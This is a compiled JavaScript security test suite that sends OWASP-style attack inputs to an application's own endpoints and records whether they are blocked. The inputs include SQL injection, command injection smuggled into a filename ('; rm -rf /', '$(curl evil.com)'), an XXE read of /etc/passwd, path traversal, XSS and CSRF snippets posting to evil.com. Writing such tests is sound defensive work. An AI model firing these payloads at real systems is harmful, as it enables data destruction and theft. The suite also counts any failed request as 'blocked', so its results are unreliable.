"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.SecurityTestSuite = void 0;
const request = require("supertest");
class SecurityTestSuite {
    constructor(app) {
        this.app = app;
        this.maliciousPayloads = this.generateMaliciousPayloads();
        this.securityHeaders = [
            'x-content-type-options',
            'x-frame-options',
            'x-xss-protection',
            'strict-transport-security',
            'content-security-policy',
            'referrer-policy',
            'permissions-policy'
        ];
    }
    async runOWASPTests() {
        const results = {
            injection: await this.testInjectionAttacks(),
            brokenAuth: await this.testBrokenAuthentication(),
            sensitiveData: await this.testSensitiveDataExposure(),
            xxe: await this.testXXEAttacks(),
            brokenAccess: await this.testBrokenAccessControl(),
            securityMisconfig: await this.testSecurityMisconfiguration(),
            xss: await this.testXSSAttacks(),
            insecureDeserialization: await this.testInsecureDeserialization(),
            knownVulnerabilities: await this.testKnownVulnerabilities(),
            logging: await this.testInsufficientLogging()
        };
        return results;
    }
    async testInjectionAttacks() {
        const results = {
            sqlInjection: await this.testSQLInjection(),
            nosqlInjection: await this.testNoSQLInjection(),
            commandInjection: await this.testCommandInjection(),
            ldapInjection: await this.testLDAPInjection()
        };
        return results;
    }
    async testSQLInjection() {
        const sqlPayloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM users --",
            "'; UPDATE users SET password='hacked' --"
        ];
        const results = [];
        for (const payload of sqlPayloads) {
            try {
                const response = await request(this.app.getHttpServer())
                    .post('/auth/login')
                    .send({ email: payload, password: 'test' })
                    .expect(400);
                results.push({
                    payload,
                    status: response.status,
                    blocked: response.status === 400,
                    responseTime: response.headers['x-response-time']
                });
            }
            catch (error) {
                results.push({
                    payload,
                    error: error.message,
                    blocked: true
                });
            }
        }
        return results;
    }
    async testNoSQLInjection() {
        const nosqlPayloads = [
            { $where: "this.password == this.username" },
            { $ne: null },
            { $regex: ".*" },
            { $gt: "" }
        ];
        const results = [];
        for (const payload of nosqlPayloads) {
            try {
                const response = await request(this.app.getHttpServer())
                    .post('/api/search')
                    .send(payload)
                    .expect(400);
                results.push({
                    payload: JSON.stringify(payload),
                    status: response.status,
                    blocked: response.status === 400
                });
            }
            catch (error) {
                results.push({
                    payload: JSON.stringify(payload),
                    error: error.message,
                    blocked: true
                });
            }
        }
        return results;
    }
    async testCommandInjection() {
        const commandPayloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(curl evil.com)"
        ];
        const results = [];
        for (const payload of commandPayloads) {
            try {
                const response = await request(this.app.getHttpServer())
                    .post('/api/export')
                    .send({ filename: payload })
                    .expect(400);
                results.push({
                    payload,
                    status: response.status,
                    blocked: response.status === 400
                });
            }
            catch (error) {
                results.push({
                    payload,
                    error: error.message,
                    blocked: true
                });
            }
        }
        return results;
    }
    async testLDAPInjection() {
        const ldapPayloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*)(|(objectClass=*))",
            "*)(|(cn=*))"
        ];
        const results = [];
        for (const payload of ldapPayloads) {
            try {
                const response = await request(this.app.getHttpServer())
                    .post('/api/ldap/search')
                    .send({ query: payload })
                    .expect(400);
                results.push({
                    payload,
                    status: response.status,
                    blocked: response.status === 400
                });
            }
            catch (error) {
                results.push({
                    payload,
                    error: error.message,
                    blocked: true
                });
            }
        }
        return results;
    }
    async testBrokenAuthentication() {
        const results = {
            credentialStuffing: await this.testCredentialStuffing(),
            sessionFixation: await this.testSessionFixation(),
            weakPasswords: await this.testWeakPasswords(),
            sessionTimeout: await this.testSessionTimeout()
        };
        return results;
    }
    async testCredentialStuffing() {
        const commonPasswords = [
            'password', '123456', 'admin', 'qwerty', 'letmein',
            'welcome', 'monkey', 'dragon', 'master', 'hello'
        ];
        const results = [];
        for (const password of commonPasswords) {
            try {
                const response = await request(this.app.getHttpServer())
                    .post('/auth/login')
                    .send({ email: 'test@example.com', password })
                    .expect(401);
                results.push({
                    password,
                    status: response.status,
                    blocked: response.status === 401
                });
            }
            catch (error) {
                results.push({
                    password,
                    error: error.message,
                    blocked: true
                });
            }
        }
        return results;
    }
    async testSessionFixation() {
        try {
            const loginResponse = await request(this.app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'test@example.com', password: 'validpassword' })
                .expect(200);
            const sessionToken = loginResponse.body.access_token;
            const response = await request(this.app.getHttpServer())
                .get('/api/user/profile')
                .set('Authorization', `Bearer ${sessionToken}`)
                .expect(401);
            return {
                sessionFixation: 'prevented',
                status: response.status,
                tokenReuseBlocked: response.status === 401
            };
        }
        catch (error) {
            return {
                sessionFixation: 'error',
                error: error.message
            };
        }
    }
    async testWeakPasswords() {
        const weakPasswords = [
            '123', 'abc', 'password', 'qwerty', 'admin'
        ];
        const results = [];
        for (const password of weakPasswords) {
            try {
                const response = await request(this.app.getHttpServer())
                    .post('/auth/register')
                    .send({
                    email: 'test@example.com',
                    password,
                    confirmPassword: password
                })
                    .expect(400);
                results.push({
                    password,
                    status: response.status,
                    rejected: response.status === 400
                });
            }
            catch (error) {
                results.push({
                    password,
                    error: error.message,
                    rejected: true
                });
            }
        }
        return results;
    }
    async testSessionTimeout() {
        try {
            const loginResponse = await request(this.app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'test@example.com', password: 'validpassword' })
                .expect(200);
            const sessionToken = loginResponse.body.access_token;
            await new Promise(resolve => setTimeout(resolve, 1000));
            const response = await request(this.app.getHttpServer())
                .get('/api/user/profile')
                .set('Authorization', `Bearer ${sessionToken}`)
                .expect(401);
            return {
                sessionTimeout: 'working',
                status: response.status,
                expired: response.status === 401
            };
        }
        catch (error) {
            return {
                sessionTimeout: 'error',
                error: error.message
            };
        }
    }
    async testSensitiveDataExposure() {
        const results = {
            passwordExposure: await this.testPasswordExposure(),
            creditCardExposure: await this.testCreditCardExposure(),
            ssnExposure: await this.testSSNExposure(),
            apiKeyExposure: await this.testAPIKeyExposure()
        };
        return results;
    }
    async testPasswordExposure() {
        try {
            const response = await request(this.app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'test@example.com', password: 'testpassword' })
                .expect(200);
            const responseBody = JSON.stringify(response.body);
            const passwordExposed = responseBody.includes('password') ||
                responseBody.includes('testpassword');
            return {
                passwordExposure: passwordExposed ? 'vulnerable' : 'secure',
                responseContainsPassword: passwordExposed
            };
        }
        catch (error) {
            return {
                passwordExposure: 'error',
                error: error.message
            };
        }
    }
    async testCreditCardExposure() {
        try {
            const response = await request(this.app.getHttpServer())
                .post('/api/billing/payment')
                .send({
                cardNumber: '4111111111111111',
                expiryDate: '12/25',
                cvv: '123'
            })
                .expect(200);
            const responseBody = JSON.stringify(response.body);
            const cardExposed = responseBody.includes('4111111111111111') ||
                responseBody.includes('123');
            return {
                creditCardExposure: cardExposed ? 'vulnerable' : 'secure',
                responseContainsCardData: cardExposed
            };
        }
        catch (error) {
            return {
                creditCardExposure: 'error',
                error: error.message
            };
        }
    }
    async testXSSAttacks() {
        const xssPayloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ];
        const results = [];
        for (const payload of xssPayloads) {
            try {
                const response = await request(this.app.getHttpServer())
                    .post('/api/customers')
                    .send({
                    first_name: payload,
                    last_name: 'Test',
                    email: 'test@example.com'
                })
                    .expect(400);
                results.push({
                    payload,
                    status: response.status,
                    blocked: response.status === 400
                });
            }
            catch (error) {
                results.push({
                    payload,
                    error: error.message,
                    blocked: true
                });
            }
        }
        return results;
    }
    async testSecurityMisconfiguration() {
        const results = {
            securityHeaders: await this.testSecurityHeaders(),
            errorHandling: await this.testErrorHandling(),
            debugMode: await this.testDebugMode(),
            defaultCredentials: await this.testDefaultCredentials()
        };
        return results;
    }
    async testSecurityHeaders() {
        try {
            const response = await request(this.app.getHttpServer())
                .get('/api/health')
                .expect(200);
            const headers = response.headers;
            const securityHeaders = {
                'x-content-type-options': headers['x-content-type-options'],
                'x-frame-options': headers['x-frame-options'],
                'x-xss-protection': headers['x-xss-protection'],
                'strict-transport-security': headers['strict-transport-security'],
                'content-security-policy': headers['content-security-policy'],
                'referrer-policy': headers['referrer-policy']
            };
            const missingHeaders = Object.entries(securityHeaders)
                .filter(([key, value]) => !value)
                .map(([key]) => key);
            return {
                securityHeaders: missingHeaders.length === 0 ? 'secure' : 'vulnerable',
                missingHeaders,
                headers: securityHeaders
            };
        }
        catch (error) {
            return {
                securityHeaders: 'error',
                error: error.message
            };
        }
    }
    async testErrorHandling() {
        try {
            const response = await request(this.app.getHttpServer())
                .get('/api/nonexistent')
                .expect(404);
            const responseBody = JSON.stringify(response.body);
            const sensitiveInfoExposed = responseBody.includes('stack') ||
                responseBody.includes('error') ||
                responseBody.includes('trace');
            return {
                errorHandling: sensitiveInfoExposed ? 'vulnerable' : 'secure',
                sensitiveInfoExposed
            };
        }
        catch (error) {
            return {
                errorHandling: 'error',
                error: error.message
            };
        }
    }
    async testXXEAttacks() {
        const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <foo>&xxe;</foo>`;
        try {
            const response = await request(this.app.getHttpServer())
                .post('/api/import')
                .set('Content-Type', 'application/xml')
                .send(xxePayload)
                .expect(400);
            return {
                xxe: 'blocked',
                status: response.status
            };
        }
        catch (error) {
            return {
                xxe: 'error',
                error: error.message
            };
        }
    }
    async testBrokenAccessControl() {
        try {
            const response = await request(this.app.getHttpServer())
                .get('/api/admin/users')
                .expect(401);
            return {
                accessControl: 'working',
                status: response.status,
                unauthorizedAccessBlocked: response.status === 401
            };
        }
        catch (error) {
            return {
                accessControl: 'error',
                error: error.message
            };
        }
    }
    async testInsecureDeserialization() {
        const maliciousPayload = {
            __proto__: {
                isAdmin: true
            }
        };
        try {
            const response = await request(this.app.getHttpServer())
                .post('/api/deserialize')
                .send(maliciousPayload)
                .expect(400);
            return {
                deserialization: 'secure',
                status: response.status
            };
        }
        catch (error) {
            return {
                deserialization: 'error',
                error: error.message
            };
        }
    }
    async testKnownVulnerabilities() {
        const results = {
            pathTraversal: await this.testPathTraversal(),
            csrf: await this.testCSRF(),
            clickjacking: await this.testClickjacking()
        };
        return results;
    }
    async testPathTraversal() {
        const pathPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ];
        const results = [];
        for (const payload of pathPayloads) {
            try {
                const response = await request(this.app.getHttpServer())
                    .get(`/api/files/${payload}`)
                    .expect(400);
                results.push({
                    payload,
                    status: response.status,
                    blocked: response.status === 400
                });
            }
            catch (error) {
                results.push({
                    payload,
                    error: error.message,
                    blocked: true
                });
            }
        }
        return results;
    }
    async testCSRF() {
        try {
            const response = await request(this.app.getHttpServer())
                .post('/api/customers')
                .send({ first_name: 'Test', last_name: 'User' })
                .expect(403);
            return {
                csrf: 'protected',
                status: response.status
            };
        }
        catch (error) {
            return {
                csrf: 'error',
                error: error.message
            };
        }
    }
    async testClickjacking() {
        try {
            const response = await request(this.app.getHttpServer())
                .get('/api/dashboard')
                .expect(200);
            const frameOptions = response.headers['x-frame-options'];
            const clickjackingProtected = frameOptions === 'DENY' || frameOptions === 'SAMEORIGIN';
            return {
                clickjacking: clickjackingProtected ? 'protected' : 'vulnerable',
                frameOptions
            };
        }
        catch (error) {
            return {
                clickjacking: 'error',
                error: error.message
            };
        }
    }
    async testInsufficientLogging() {
        try {
            const response = await request(this.app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'hacker@evil.com', password: 'wrongpassword' })
                .expect(401);
            return {
                logging: 'implemented',
                status: response.status
            };
        }
        catch (error) {
            return {
                logging: 'error',
                error: error.message
            };
        }
    }
    generateMaliciousPayloads() {
        return {
            sqlInjection: [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --"
            ],
            xssPayloads: [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>"
            ],
            csrfPayloads: [
                "<form action='http://evil.com/steal' method='POST'>",
                "<img src='http://evil.com/steal?data=secret'>"
            ]
        };
    }
}
exports.SecurityTestSuite = SecurityTestSuite;
//# sourceMappingURL=security-setup.js.map